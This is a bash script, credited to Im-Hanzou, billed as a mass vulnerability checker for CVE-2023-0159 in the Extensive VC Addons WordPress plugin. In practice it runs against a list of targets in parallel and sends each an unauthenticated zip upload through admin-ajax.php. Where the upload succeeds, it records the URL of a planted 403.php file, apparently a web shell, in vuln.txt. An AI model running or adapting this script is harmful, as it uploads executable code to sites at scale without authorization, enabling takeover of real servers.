#!/bin/bash
# CVE-2023-0159 - Extensive VC Addons for WPBakery page builder | Vulnerability Checker
# Created By Im-Hanzou
# Using GNU Parallel
# Usage: bash evcer.sh list.txt thread

yellow='\033[0;33m'
cat << "EOF"
                                        
 _______ _    _ _______ _______  ______
 |______  \  /  |       |______ |_____/
 |______   \/   |_____  |______ |    \_
                                       
EOF
printf "CVE-2023-0159 Mass Vulnerability Checker\n\n"
printf "${yellow}Created By Im-Hanzou
Github : im-hanzou\n\n"

touch vuln.txt notvuln.txt
exploit(){	
classic='\033[0m'
red='\e[41m'
green='\e[42m'
target=$1
thread=$2

if [[ $(curl -s -F "fonticonzipfile=@403.zip" -F "fontsetname=exs" -F "action=uploadFontIcon" --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php?action=uploadFontIcon') =~ '/wp-content/uploads/kaswara/fonts_icon/exs/' ]]; 
then
    printf "${green}[ Vuln ]${classic} => [$target/wp-content/uploads/kaswara/fonts_icon/exs/403.php] \n";
    echo "$target/wp-content/uploads/kaswara/fonts_icon/exs/403.php" >> vuln.txt
    else
    printf "${red}[ Not Vuln ]${classic} => $target \n";
    echo "$target" >> notvuln.txt
fi
}

export -f exploit
parallel -j $2 exploit :::: $1 

total=$(cat vuln.txt | wc -l)
totalb=$(cat notvuln.txt | wc -l)
printf "\033[0;36mTotal Vuln : $total\n";
printf "\033[0;36mTotal Not Vuln : $totalb\n";
